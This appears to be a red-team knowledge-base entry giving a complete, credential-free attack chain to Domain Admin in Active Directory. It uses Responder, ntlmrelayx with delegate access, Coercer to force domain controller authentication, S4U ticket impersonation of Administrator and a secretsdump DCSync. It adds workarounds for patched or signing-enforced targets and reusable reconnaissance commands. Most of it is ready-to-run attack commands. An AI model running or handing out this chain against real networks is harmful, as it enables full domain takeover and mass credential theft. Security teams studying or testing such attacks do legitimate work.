# [2026-04] NTLM relay + Coercer → Domain Admin (no password needed)

## Scenario category
Penetration testing / internal network / AD attacks

## Target overview
With internal network access but no credentials at all, reach Domain Admin through an NTLM relay chain.

## Full execution chain

1. Once on the internal network, start Responder listening (with SMB/HTTP disabled)
   ```bash
   # Edit /etc/responder/Responder.conf
   # SMB = Off, HTTP = Off
   responder -I eth0 -v
   ```

2. Start ntlmrelayx relaying to LDAP (for the AD CS attack)
   ```bash
   ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
   ```

3. Use Coercer to force the DC to authenticate to us
   ```bash
   coercer coerce -u '' -p '' -d domain.local \
     -l attacker_ip -t dc01.domain.local --always-continue
   ```

4. The DC machine account's NTLM authentication is relayed to LDAP
5. ntlmrelayx automatically creates a machine account and configures constrained delegation
6. Impersonate Domain Admin with S4U2Self + S4U2Proxy
   ```bash
   getST.py -spn cifs/dc01.domain.local \
     -impersonate Administrator \
     domain.local/CREATED_MACHINE\$:'password' -dc-ip 10.0.0.1
   ```

7. DCSync using the ticket
   ```bash
   export KRB5CCNAME=Administrator.ccache
   secretsdump.py -k -no-pass dc01.domain.local
   ```

## Pitfalls encountered

| Problem | Cause | Fix | Time lost |
|------|------|---------|------|
| Coercer cannot trigger authentication | Target DC patched, PetitPotam disabled | Switch to PrinterBug (MS-RPRN) | 30min |
| ntlmrelayx reports LDAP signing required | DC enforces LDAP signing | Relay to LDAPS (636) or the AD CS HTTP endpoint instead | 20min |
| The created machine account cannot S4U | Domain policy limits machine account creation | Use an existing low-privileged domain account instead | 15min |

## Toolchain findings
- Coercer is more convenient than invoking PetitPotam by hand, and tries several protocols automatically
- ntlmrelayx's `--delegate-access` flag is the key one; it configures delegation automatically
- If LDAP signing is enforced, relay to the AD CS HTTP endpoint instead (ESC8)

## Key code and commands

```bash
# The full attack chain end to end (needs 3 terminals)
# Terminal 1: Responder
responder -I eth0 -v

# Terminal 2: ntlmrelayx
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access --escalate-user attacker

# Terminal 3: Coercer
coercer coerce -u '' -p '' -d domain.local -l attacker_ip -t dc01.domain.local
```

## Reusable patterns and script fragments

```bash
# Quick check for NTLM relay viability
# 1. Check SMB signing
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# 2. Check LDAP signing
crackmapexec ldap dc01.domain.local -u '' -p '' -M ldap-checker

# 3. Check which protocols can be triggered
coercer scan -u user -p pass -d domain.local -t dc01.domain.local
```

## Suggested improvements to this pack
- Coercer and Responder are already in routing and bootstrap ✓
- ntlmrelayx ships with impacket, preinstalled on Kali ✓

## Follow-up actions
- [x] No update needed (already covered)

## Environment
- Kali 2026.1, impacket 0.12.0, coercer 2.4.3
- Target: Windows Server 2022 DC, domain functional level 2016
- Precondition: internal network access already obtained (via a VPN vulnerability)
